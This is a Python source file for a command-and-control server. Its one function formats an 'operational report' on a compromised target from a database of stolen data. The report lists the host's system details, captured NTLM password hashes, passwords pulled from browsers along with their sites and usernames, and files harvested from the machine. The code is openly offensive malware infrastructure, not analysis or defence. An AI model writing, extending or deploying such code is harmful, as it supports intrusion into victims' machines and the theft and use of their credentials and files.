import os
import json
import time

def generate_full_report(agent_id, db_path):
    import sqlite3
    conn = sqlite3.connect(db_path)
    c = conn.cursor()
    
    report = f"==================================================\n"
    report += f"        ELITE C2 OPERATIONAL REPORT\n"
    report += f"        TARGET: {agent_id}\n"
    report += f"        GENERATED: {time.ctime()}\n"
    report += f"==================================================\n\n"
    
    try:
        # 1. System Info
        c.execute("SELECT hostname, os_name, ip_addr, last_checkin FROM agents WHERE agent_id=?", (agent_id,))
        agent = c.fetchone()
        if agent:
            report += "--- [ SYSTEM INFO ] ---\n"
            report += f"Hostname: {agent[0]}\n"
            report += f"OS:       {agent[1]}\n"
            report += f"IP:       {agent[2]}\n"
            ts = agent[3] if isinstance(agent[3], (int, float)) else time.time()
            report += f"Check-in: {time.ctime(ts)}\n\n"
        
        # 2. Captured Hashes
        try:
            c.execute("SELECT username, ntlm_hash FROM hashes WHERE agent_id=?", (agent_id,))
            hashes = c.fetchall()
            if hashes:
                report += "--- [ NTLM HASHES ] ---\n"
                for h in hashes:
                    report += f"{h[0]}: {h[1]}\n"
                report += "\n"
        except: pass
            
        # 3. Browser Passwords
        try:
            c.execute("SELECT browser, url, username, password FROM browser_creds WHERE agent_id=?", (agent_id,))
            vault = c.fetchall()
            if vault:
                report += "--- [ BROWSER VAULT ] ---\n"
                for v in vault:
                    report += f"[{v[0]}] {v[1]} | {v[2]} : {v[3]}\n"
                report += "\n"
        except: pass
            
        # 4. Harvested Files
        try:
            c.execute("SELECT filename, path, size FROM harvested_files WHERE agent_id=?", (agent_id,))
            files = c.fetchall()
            if files:
                report += "--- [ HARVESTED FILES ] ---\n"
                for f in files:
                    report += f"{f[0]} ({f[2]} bytes) @ {f[1]}\n"
                report += "\n"
        except: pass
    except Exception as e:
        report += f"\n[!] Error during report synthesis: {str(e)}\n"
        
    report += "==================================================\n"
    report += "        END OF REPORT\n"
    report += "==================================================\n"
    
    conn.close()
    return report
